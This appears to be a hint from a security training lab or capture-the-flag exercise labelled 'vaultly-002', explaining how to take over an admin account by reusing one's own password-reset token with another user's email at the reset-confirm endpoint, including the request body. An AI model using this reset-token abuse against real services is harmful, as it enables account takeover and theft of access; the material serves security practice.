* Hint : **Can you take over someone else's account?** `vaultly-002`

  * Reset your password `/settings/security` Email me a reset link
  * `/api/auth/reset/request` click link `/api/auth/reset/confirm`
  * Now another reset link `/api/auth/reset/request` copy token and use `/api/auth/reset/confirm` and the email `admin@acme.test`
    ```text
    token=xxxx&email=admin%40acme.test&password=Pass%40123
    ```
